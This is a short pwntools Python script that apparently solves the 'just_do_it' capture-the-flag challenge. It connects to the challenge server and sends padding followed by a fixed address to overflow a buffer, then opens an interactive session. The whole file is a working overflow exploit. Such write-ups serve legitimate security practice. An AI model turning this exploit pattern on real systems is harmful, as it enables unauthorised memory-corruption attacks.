from pwn import *

context.log_level = 'debug'

local=0

if local:
	cn = process('./just_do_it')
else:
	cn = remote('pwn1.chal.ctf.westerns.tokyo', 12345)


cn.recvuntil('password.')

pay = 'a'*20+p32(0x0804A080)
pay.ljust(32,'a')
cn.sendline(pay)

cn.interactive()